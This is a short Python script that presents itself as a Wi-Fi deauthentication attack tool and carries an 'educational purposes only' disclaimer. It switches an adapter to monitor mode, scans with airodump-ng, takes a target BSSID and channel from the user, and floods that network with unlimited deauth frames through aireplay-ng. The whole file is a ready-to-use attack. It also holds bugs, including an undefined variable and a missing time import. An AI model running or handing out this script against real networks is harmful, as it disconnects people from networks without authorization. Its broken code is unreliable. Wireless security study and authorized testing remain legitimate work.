#!/usr/bin/env python3

# This is a Deauth Attacking Script#
# Disclaimer: This script is for educational purposes only.  Do not use against any network that you don't own or have authorization to test on.
# Made by Madboy


import os
import subprocess
import re 


#Check if running as root.
if not 'SUDO_UID' in os.environ.keys():
    print("Try running this program with sudo.")
    exit()

#Get interface info
wlan_pattern = re.compile("^wlan[0-9]+")

check_wifi_result = wlan_pattern.findall(subprocess.run(["iwconfig"], capture_output=True).stdout.decode())

#Wi-Fi Adapter Check.
if len(check_wifi_result2) == 0 :
    print("Please connect a WiFi adapter.")
    exit()

#Switching adapter to Monitor mode.
subprocess.run(["airmon-ng", "start", "wlan0"])
subprocess.run(["airmon-ng", "check", "kill"])

#Start scanning for networks until stopped by user.
print("Scanning, Press Ctrl-C When you aqquire a target")
try:
    os.system("airodump-ng wlan0mon")
    time.sleep(1)

except KeyboardInterrupt:
    print("\nDone.") 

#Getting target info for the attack.
choice = input("Please enter network BSSID: ")
channel = input("please enter the network channel: ")

#Switching to the targets channel
subprocess.run(["airmon-ng", "start", "wlan0mon", channel])

#Deauth until interrupted.
try:
    subprocess.run(["aireplay-ng", "--deauth", "0", "-a", choice, "wlan0mon"])

#Getting interface and NetworkManager back to normal.
except KeyboardInterrupt:
    subprocess.run(["airmon-ng", "stop", "wlan0mon"])
    subprocess.run(["service","NetworkManager", "start"])
    print("GL!")
